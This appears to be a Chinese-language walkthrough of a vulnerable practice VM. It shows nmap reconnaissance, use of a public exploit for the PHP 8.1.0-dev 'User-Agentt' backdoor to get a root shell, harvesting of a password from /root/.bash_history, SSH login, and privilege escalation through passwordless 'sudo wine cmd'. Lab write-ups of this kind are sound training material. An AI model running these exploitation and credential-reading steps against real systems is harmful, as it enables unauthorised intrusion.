## 靶机地址

[Proton Drive](https://drive.proton.me/urls/027V63ZCQR#iT7At4N7gM0b)

![image-20250324082204139](./assets/image-20250324082204139.png)





## 信息收集

### nmap扫描

#### 准备阶段

```
mkdir nmapscan
```

![image-20250324082244331](./assets/image-20250324082244331.png)



#### 主机探测

```
nmap -sn 192.168.23.0/24
```

![image-20250324082313878](./assets/image-20250324082313878.png)

确定靶机ip：

192.168.23.142



#### 端口扫描

```
nmap -p- --min-rate 10000 -sT 192.168.23.142 -oA ./nmapscan/ports
```

![image-20250324082352991](./assets/image-20250324082352991.png)



#### 提取端口信息

```
ports
```

![image-20250324082716042](./assets/image-20250324082716042.png)

![image-20250324082730649](./assets/image-20250324082730649.png)



#### 详细结果扫描

```
nmap -sT -sC -sV -O -p 22,80,8080 192.168.23.142 -oA ./nmapscan/detail
```

![image-20250324082837235](./assets/image-20250324082837235.png)

分析：

- 22 ssh OpenSSH 8.4p1
- 80 http Apache httpd 2.4.56
- 8080 http PHP 8.1.0-dev
- PHP 8.1.0-dev存在"User-Agentt"远程执行漏洞



### 搜索相关漏洞

```
searchsploit php 8.1.0-dev
searchsploit -m php/webapps/49933.py
```

![image-20250324083349041](./assets/image-20250324083349041.png)

![image-20250324083421287](./assets/image-20250324083421287.png)



### 执行

```
python3 49933.py
http://192.168.23.142:8080/
whoami
```

![image-20250324083732509](./assets/image-20250324083732509.png)

已经是root权限的shell



### 查看用户信息

```
cat /etc/passwd
```

![image-20250324083844906](./assets/image-20250324083844906.png)

无可用用户，推测是在docker容器中



### 寻找可用信息

```
ls -al /root/
cat /root/.bash_history
```

![image-20250324084008358](./assets/image-20250324084008358.png)

![image-20250324084016997](./assets/image-20250324084016997.png)

得到一个用户名和密码

```
liam：L14mD0ck3Rp0w4
```



### ssh登录

```
ssh liam@192.168.23.142
```

![image-20250324084052971](./assets/image-20250324084052971.png)

登录成功



## 提权

### 得到第一个flag

```
ls
cat user.txt
```

![image-20250324084130162](./assets/image-20250324084130162.png)



### 执行sudo -l

```
sudo -l
```

![image-20250324084151395](./assets/image-20250324084151395.png)

无密码执行wine

wine允许在linux上运行一些windows应用

- 这里我本来想的是msfvenom生成windows远控木马，然后实现提权，但是后来发现不用，直接执行cmd就可以得到root权限的shell



### wine提权

```
sudo wine cmd
```

![image-20250324084904964](./assets/image-20250324084904964.png)

![image-20250324084918653](./assets/image-20250324084918653.png)



### 得到第二

### 个flag

```
dir
type user.txt
```

![image-20250324084937457](./assets/image-20250324084937457.png)